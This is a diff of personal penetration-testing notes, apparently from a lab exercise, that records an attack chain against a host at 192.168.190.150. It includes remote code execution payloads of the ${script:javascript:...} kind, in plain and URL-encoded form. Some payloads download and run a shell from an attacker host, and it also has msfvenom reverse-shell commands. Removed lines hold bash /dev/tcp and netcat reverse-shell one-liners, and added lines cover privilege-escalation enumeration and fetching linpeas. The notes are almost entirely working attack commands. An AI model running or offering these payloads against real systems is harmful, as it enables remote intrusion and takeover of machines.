@@ -217,15 +217,22 @@ ssh -i id_rsa john@192.168.190.150
 sudo tcpdump -i tun0 proto \\icmp
 ${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c3 192.168.45.234')}
 
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell
+# this produces shell code
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh
 
-${script:javascript:java.lang.Runtime.getRuntime().exec("/bin/bash -c 'exec 5<>/dev/tcp/192.168.45.234/22;cat <&5 | while read line; do $line 2>&5 >&5; done'")
+# this produces a bash one-liner
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=22 -f raw -o shell.sh
 
-${script:javascript:java.lang.Runtime.getRuntime().exec('wget http://192.168.45.234/shell -O /dev/shm/shell')
+# use burp repeater to download then execute the shell
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('wget%20192.168.45.234%2Fshell%20-O%20/dev/shm/shell.sh')%7D
 
-${script:javascript:java.lang.Runtime.getRuntime().exec("sh /dev/shm/shell")
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('bash%20/dev/shm/shell.sh')%7D
 
-${script:javascript:java.lang.Runtime.getRuntime().exec("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.234 22 >/tmp/f")
-rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+.150 privesc
+```
+ss -ntplu
+# find an internal webserver on port 8000
 
+wget http://192.168.45.234/linpeas.sh -O linpeas.sh
 ```
